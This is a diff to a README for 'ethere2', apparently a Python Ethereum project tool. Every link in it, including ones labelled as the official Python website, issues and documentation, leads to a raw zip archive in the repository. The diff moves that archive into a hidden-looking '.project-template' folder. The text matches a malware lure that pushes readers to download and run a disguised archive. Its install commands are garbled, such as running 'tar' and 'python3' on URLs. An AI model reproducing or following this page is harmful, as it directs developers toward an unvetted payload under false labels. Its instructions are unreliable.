@@ -1,7 +1,7 @@
 # ✨ ethere2 - Streamline Python Ethereum Projects Easily
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip%https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip)](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip)
+[![Download Release](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip%https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip)](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,18 +10,18 @@ Follow these simple steps to download and run the ethere2 application. This tool
 ## 🖥️ System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Python Version:** Python 3.6 or above must be installed on your system. If you do not have Python installed yet, please visit the [official Python website](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip) to download and install it.
+- **Python Version:** Python 3.6 or above must be installed on your system. If you do not have Python installed yet, please visit the [official Python website](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip) to download and install it.
 
 ## 📂 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip) to access the latest version of the software.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip) to access the latest version of the software.
 
 2. **Choose the Correct File**  
    Look for the release you want. All available versions will be listed. Depending on your operating system, select the appropriate file. You might see options like:
-   - **Windows:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip`
-   - **macOS:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip`
-   - **Linux:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip`
+   - **Windows:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip`
+   - **macOS:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip`
+   - **Linux:** `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip`
 
 3. **Download the File**  
    Click on the file's name to start the download. The file will save to your computer's default download location.
@@ -30,20 +30,20 @@ Follow these simple steps to download and run the ethere2 application. This tool
    Before running the program, you will need to extract the downloaded file.
    - For Windows, right-click on the `.zip` file and select "Extract All."
    - For macOS, double-click the `.zip` file to extract it.
-   - For Linux, open your terminal and use the command `tar -xzf https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip` to extract the files.
+   - For Linux, open your terminal and use the command `tar -xzf https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip` to extract the files.
 
 5. **Run ethere2**  
    Navigate to the folder where you extracted the files. You can do this using the file explorer or the terminal.
 
-   - For Windows and macOS, double-click `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip` to run the program directly.
-   - For Linux, open a terminal in the extracted folder and type `python3 https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip` to launch the application.
+   - For Windows and macOS, double-click `https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip` to run the program directly.
+   - For Linux, open a terminal in the extracted folder and type `python3 https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip` to launch the application.
 
 ## 📋 Usage Guide
 
 After you run ethere2, you will see a user interface that allows you to create a new Ethereum project. Here are some primary features:
 
 - **Project Setup:** Create a new project with pre-defined folders and files.
-- **Dependency Management:** Automatically handle necessary packages with https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip
+- **Dependency Management:** Automatically handle necessary packages with https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip
 - **Basic Templates:** Begin your project with handy templates for smart contracts and scripts.
 
 ## 🔍 Features
@@ -55,16 +55,16 @@ After you run ethere2, you will see a user interface that allows you to create a
 
 ## 🔗 Support
 
-If you have questions or need assistance, check the [issues section](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip) of the GitHub repository. You can report bugs or request features here.
+If you have questions or need assistance, check the [issues section](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip) of the GitHub repository. You can report bugs or request features here.
 
 ## 📖 Documentation
 
-For more detailed help and advanced features, refer to the [official documentation](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip). This contains thorough guides on how to use the software effectively.
+For more detailed help and advanced features, refer to the [official documentation](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip). This contains thorough guides on how to use the software effectively.
 
 ## 💬 Community Contribution
 
-We encourage contributions from users. If you would like to help improve ethere2, please visit the [contributing guidelines](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip) for more information on how to get involved.
+We encourage contributions from users. If you would like to help improve ethere2, please visit the [contributing guidelines](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip) for more information on how to get involved.
 
 ## 📥 Download & Install
 
-Remember, to start your journey with ethere2, visit the [Releases page](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/scripts/release/ethere2-2.8.zip) and download the latest version of the software. Follow the installation instructions above, and you'll be ready to explore Python development for Ethereum projects in no time!
+Remember, to start your journey with ethere2, visit the [Releases page](https://raw.githubusercontent.com/Hirokubo2047/ethere2/main/.project-template/ethere_1.1-beta.4.zip) and download the latest version of the software. Follow the installation instructions above, and you'll be ready to explore Python development for Ethereum projects in no time!
